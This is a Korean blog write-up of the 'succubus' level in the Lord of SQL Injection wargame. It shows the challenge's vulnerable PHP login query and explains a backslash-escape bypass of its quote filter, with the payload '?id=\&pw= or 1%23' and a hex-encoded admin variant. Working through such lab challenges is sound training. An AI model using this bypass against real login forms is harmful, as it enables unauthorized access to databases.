---
title: "[Lord of SQL Injection] LoS - succubus 문제풀이"
date: 2018-08-05
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제는 `succubus`이다.
`succubus`는 처음 듣는 이름이라 찾아봤는데, 중세 유럽의 전설이랑 민속에 나오는 악마 이름이라고 한다.  

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------------------------
query : select id from prob_succubus where id='' and pw=''
-------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

지난 번 문제랑 뭐가 다른가 했는데, `ereg()` 대신에 `preg_match()`가 사용되었다.
이번엔 정말로 `'`를 우회해야 하는 문제인 것 같다.
처음에는 `preg_match()` 함수에 취약점이 있지 않을까 생각했다.
그런데 아무리 찾아도 취약점이 있다는 내용이 보이지 않았고, 아직까지 `preg_match()`에 대한 취약점이 나오지 않았다는 글이 2017년에 올라와 있었다.

그럼 다른 방법으로 문제를 풀어야 했기 때문에 엄청 고민을 했다.
이런저런 키워드로 검색을 했는데, 그러다가 `\`에 필터링이 없을 경우 이를 이용 해 문제를 풀 수 있다는 내용을 봤다.
문제에서, `id`와 `pw`를 입력받고 있다.
이 때, 만약 `id`에 `\`를 입력하고 `pw`에는 ` or 1#`를 입력하면 완성되는 쿼리는 아래와 같다.  

```mysql
select id from prob_succubus where id='\' and pw' or 1#
```

때문에 `id`의 뒤에 있는 `'`는 `\'`가 되며 싱글 쿼터 내의 문자로 인식된다.
즉, `id`가 `' and pw`인 행을 찾게 되는 것이다.
물론 테이블에는 `id`가 `' and pw`인 행은 없을 것이므로, 뒤의 `or 1`이 실행되며 값을 추출할 수 있게 된다.
따라서 아래와 같이 입력하면 문제를 풀 수 있다.  

```plain
?id=\&pw= or 1%23
```

문제에서는 결과로 추출 된 `id`만 있으면 되기 때문에 `or 1`을 사용했는데, 만약 `admin`인 `id`를 추출했어야 했다면 `or id=0x61646d696e%23`을 `pw`에 입력하면 문제를 풀 수 있다.  

```php
--------------------------------------------------------------------------------------
query : select id from prob_succubus where id='\' and pw=' or 1#'
--------------------------------------------------------------------------------------

SUCCUBUS Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
SUCCUBUS Clear!!
```